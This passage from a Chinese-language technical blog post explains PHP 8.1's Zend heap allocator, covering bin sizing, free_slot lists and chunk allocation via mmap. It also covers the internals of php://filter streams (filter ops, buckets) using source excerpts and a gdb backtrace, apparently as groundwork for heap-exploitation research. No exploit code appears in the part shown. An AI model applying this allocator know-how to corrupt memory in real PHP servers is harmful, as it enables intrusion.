</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">void      </span><span style="color:#c0c5ce;">*(*_realloc)(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*, size_t);
</span><span style="color:#c0c5ce;">		} std;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">void      </span><span style="color:#c0c5ce;">*(*_malloc)(size_t ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">void       </span><span style="color:#c0c5ce;">(*_free)(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">void      </span><span style="color:#c0c5ce;">*(*_realloc)(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*, size_t  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
</span><span style="color:#c0c5ce;">		} debug;
</span><span style="color:#c0c5ce;">	} custom_heap;
</span><span style="color:#c0c5ce;">	HashTable *tracked_allocs;
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>在申请小内存时（&lt;=0xc00）会通过宏<code>ZEND_MM_SMALL_SIZE_TO_BIN</code>计算bin_num</p>
<ul>
<li>size&lt;=0x40 对应<code>(size - !!size) &gt;&gt; 3</code> eg 0x18-&gt;2</li>
<li>0x40&lt;size&lt;0xc00 对应后续计算 eg 0x100-&gt;15</li>
</ul>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">ZEND_MM_SMALL_SIZE_TO_BIN</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)  </span><span style="color:#8fa1b3;">zend_mm_small_size_to_bin</span><span style="color:#c0c5ce;">(size)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> zend_always_inline </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">zend_mm_small_size_to_bin</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#b48ead;">#if </span><span style="color:#d08770;">0
</span><span style="color:#65737e;">	...
</span><span style="color:#b48ead;">#else
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> t1, t2;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(size &lt;= </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* we need to support size == 0 ... */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(size - !!size) &gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		t1 = size - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		t2 = </span><span style="color:#8fa1b3;">zend_mm_small_size_to_bit</span><span style="color:#c0c5ce;">(t1) - </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		t1 = t1 &gt;&gt; t2;
</span><span style="color:#c0c5ce;">		t2 = t2 - </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		t2 = t2 &lt;&lt; </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">)(t1 + t2);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* higher set bit number (0-&gt;N/A, 1-&gt;1, 2-&gt;2, 4-&gt;3, 8-&gt;4, 127-&gt;7, 128-&gt;8 etc) */
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> zend_always_inline </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">zend_mm_small_size_to_bit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> n = </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(size &lt;= </span><span style="color:#d08770;">0x00ff</span><span style="color:#c0c5ce;">) {n -= </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; size = size &lt;&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">;}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(size &lt;= </span><span style="color:#d08770;">0x0fff</span><span style="color:#c0c5ce;">) {n -= </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">; size = size &lt;&lt; </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(size &lt;= </span><span style="color:#d08770;">0x3fff</span><span style="color:#c0c5ce;">) {n -= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">; size = size &lt;&lt; </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(size &lt;= </span><span style="color:#d08770;">0x7fff</span><span style="color:#c0c5ce;">) {n -= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> n;
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>对应内存块递增关系如下，64对应7
<img src="./images/Pasted%20image%2020250511161007.png" alt="" /></p>
<p>源码头文件<code>zend_alloc_sizes.h</code>中有定义：
序号、chunk大小、数量、页面数</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* num, size, count, pages */
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">ZEND_MM_BINS_INFO</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">_</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">x</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">y</span><span style="color:#c0c5ce;">) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">512</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">256</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">24</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">170</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">40</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">102</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">48</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">85</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">56</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">73</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">80</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">51</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">( </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">42</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">112</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">36</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">160</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">192</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">14</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">224</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">18</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">256</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">320</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">17</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">384</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">18</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">448</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">19</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">512</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">640</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">768</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">22</span><span style="color:#c0c5ce;">,  </span><span style="color:#d08770;">896</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">23</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1024</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1280</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1536</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">26</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1792</span><span style="color:#c0c5ce;">,   </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">27</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2048</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">28</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2560</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, x, y) \
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">_</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">29</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3072</span><span style="color:#c0c5ce;">,    </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, x, y)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#endif </span><span style="color:#65737e;">/* ZEND_ALLOC_SIZES_H */
</span></pre>
<p>之后如果对应free_slot不为空，取出chunk</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> zend_always_inline </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">zend_mm_alloc_small</span><span style="color:#c0c5ce;">(zend_mm_heap *</span><span style="color:#bf616a;">heap</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> bin_num ZEND_FILE_LINE_DC </span><span style="color:#bf616a;">ZEND_FILE_LINE_ORIG_DC</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">EXPECTED</span><span style="color:#c0c5ce;">(heap-&gt;free_slot[bin_num] != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)) {
</span><span style="color:#c0c5ce;">		zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];
</span><span style="color:#c0c5ce;">		heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> p;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">zend_mm_alloc_small_slow</span><span style="color:#c0c5ce;">(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>如果发现free_slot位空 则通过<code>zend_mm_alloc_small_slow()</code>申请对应内存页
看了一下 该函数内部调用链，最终调用mmap申请内存页 大小为2*0x1000*0x1000</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">zend_mm_alloc_small_slow()
</span><span style="color:#c0c5ce;">	zend_mm_alloc_pages()
</span><span style="color:#c0c5ce;">		zend_mm_chunk_alloc()
</span><span style="color:#c0c5ce;">			zend_mm_chunk_alloc_int()
</span><span style="color:#c0c5ce;">				zend_mm_mmap()
</span><span style="color:#c0c5ce;">					mmap()
</span></pre>
<p>申请完做各种初始化 最后把页面切分 依次放入free_slot
可以看出顺序是从内存页的开始一直遍历直到碰到end</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* create a linked list of elements from 1 to last */
</span><span style="color:#c0c5ce;">	end = (zend_mm_free_slot*)((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)));
</span><span style="color:#c0c5ce;">	heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)bin + bin_data_size[bin_num]);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">do </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		p-&gt;next_free_slot = (zend_mm_free_slot*)((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)p + bin_data_size[bin_num]);
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">		p = (zend_mm_free_slot*)((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)p + bin_data_size[bin_num]);
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(p != end);
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* terminate list using NULL */
</span><span style="color:#c0c5ce;">	p-&gt;next_free_slot = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span></pre>
<p><img src="./images/Pasted%20image%2020250515142412.png" alt="" /></p>
<h3 id="php-filterjie-gou">php filter结构</h3><p><code>_php_stream_fill_read_buffer()</code>函数从底层流（文件/网络/内存）读取数据并填充到缓冲区，并调用对应的过滤器</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">pwndbg&gt; bt
</span><span style="color:#c0c5ce;">#0  0x0000557f7ca6c565 in _php_stream_fill_read_buffer (stream=stream@entry=0x7f0c5ca7f2a0, size=size@entry=9002) at /root/php-8.1.2/main/streams/streams.c:576
</span><span style="color:#c0c5ce;">#1  0x0000557f7ca6c909 in _php_stream_read (stream=stream@entry=0x7f0c5ca7f2a0, buf=&lt;optimized out&gt;, buf@entry=0x7f0c5ca85018 &quot;&quot;, size=size@entry=9002) at /root/php-8.1.2/main/streams/streams.c:718
</span><span style="color:#c0c5ce;">#2  0x0000557f7ca6df51 in _php_stream_copy_to_mem (src=src@entry=0x7f0c5ca7f2a0, maxlen=0, persistent=persistent@entry=0) at /root/php-8.1.2/main/streams/streams.c:1518
</span><span style="color:#c0c5ce;">#3  0x0000557f7c9ed4bb in zif_file_get_contents (execute_data=0x7f0c5ca140d0, return_value=0x7f0c5ca140a0) at /root/php-8.1.2/ext/standard/file.c:575
</span><span style="color:#c0c5ce;">#4  0x0000557f7c96b01c in phar_file_get_contents (execute_data=0x7f0c5ca140d0, return_value=0x7f0c5ca140a0) at /root/php-8.1.2/ext/phar/func_interceptors.c:227
</span><span style="color:#c0c5ce;">#5  0x0000557f7cb2651a in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER () at /root/php-8.1.2/Zend/zend_vm_execute.h:1297
</span><span style="color:#c0c5ce;">#6  execute_ex (ex=0x7f0c5ca7f2a0) at /root/php-8.1.2/Zend/zend_vm_execute.h:55314
</span><span style="color:#c0c5ce;">#7  0x0000557f7cb2cb94 in zend_execute (op_array=0x7f0c5ca89000, return_value=0x0) at /root/php-8.1.2/Zend/zend_vm_execute.h:59673
</span><span style="color:#c0c5ce;">#8  0x0000557f7cabf526 in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-8.1.2/Zend/zend.c:1761
</span><span style="color:#c0c5ce;">#9  0x0000557f7ca58a02 in php_execute_script (primary_file=primary_file@entry=0x7ffda4a44000) at /root/php-8.1.2/main/main.c:2535
</span><span style="color:#c0c5ce;">#10 0x0000557f7cba22e4 in do_cli (argc=2, argv=0x557f9d9d2890) at /root/php-8.1.2/sapi/cli/php_cli.c:965
</span><span style="color:#c0c5ce;">#11 0x0000557f7c83e073 in main (argc=2, argv=0x557f9d9d2890) at /root/php-8.1.2/sapi/cli/php_cli.c:1367
</span><span style="color:#c0c5ce;">#12 0x00007f0c5edf4d90 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
</span><span style="color:#c0c5ce;">#13 0x00007f0c5edf4e40 in __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6
</span><span style="color:#c0c5ce;">#14 0x0000557f7c83f1d5 in _start ()
</span></pre>
<p>调用过滤器处如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* wind the handle... */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(filter = stream-&gt;readfilters.</span><span style="color:#bf616a;">head</span><span style="color:#c0c5ce;">; filter; filter = filter-&gt;next) {
</span><span style="color:#c0c5ce;">		status = filter-&gt;fops-&gt;</span><span style="color:#8fa1b3;">filter</span><span style="color:#c0c5ce;">(stream, filter, brig_inp, brig_outp, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, flags);
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">	}
</span></pre>
<p>这里过滤器操作函数指针定义如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">typedef struct</span><span style="color:#c0c5ce;"> _php_stream_filter_ops {
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">php_stream_filter_status_t </span><span style="color:#c0c5ce;">(*filter)(
</span><span style="color:#c0c5ce;">			php_stream *stream,
</span><span style="color:#c0c5ce;">			php_stream_filter *thisfilter,
</span><span style="color:#c0c5ce;">			php_stream_bucket_brigade *buckets_in,
</span><span style="color:#c0c5ce;">			php_stream_bucket_brigade *buckets_out,
</span><span style="color:#c0c5ce;">			size_t *bytes_consumed,
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> flags
</span><span style="color:#c0c5ce;">			);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*dtor)(php_stream_filter *thisfilter);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*label;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">} php_stream_filter_ops;
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// zlib_filters.c
</span><span style="color:#b48ead;">static const</span><span style="color:#c0c5ce;"> php_stream_filter_ops php_zlib_inflate_ops = {
</span><span style="color:#c0c5ce;">	php_zlib_inflate_filter,
</span><span style="color:#c0c5ce;">	php_zlib_inflate_dtor,
</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">};
</span><span style="color:#65737e;">// filters.c
</span><span style="color:#b48ead;">static const</span><span style="color:#c0c5ce;"> php_stream_filter_ops chunked_filter_ops = {
</span><span style="color:#c0c5ce;">	php_chunked_filter,
</span><span style="color:#c0c5ce;">	php_chunked_dtor,
</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">};
</span><span style="color:#65737e;">// iconv.c
</span><span style="color:#b48ead;">static const</span><span style="color:#c0c5ce;"> php_stream_filter_ops php_iconv_stream_filter_ops = {
</span><span style="color:#c0c5ce;">	php_iconv_stream_filter_do_filter,
</span><span style="color:#c0c5ce;">	php_iconv_stream_filter_cleanup,
</span><span style="color:#c0c5ce;">	&quot;</span><span style="color:#a3be8c;">convert.iconv.*</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>php filter每次会根据内容创建堆块，作为<code>bucket</code>，并链入<code>php_stream_bucket_brigade</code>结构
经典的处理方式，<code>php_stream_bucket_new()</code>创建新bucket，<code>php_stream_bucket_append()</code>链接</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">_php_stream_bucket {
</span><span style="color:#c0c5ce;">	php_stream_bucket *next, *prev;
</span><span style="color:#c0c5ce;">	php_stream_bucket_brigade *brigade;
</span><span style="color:#c0c5ce;">
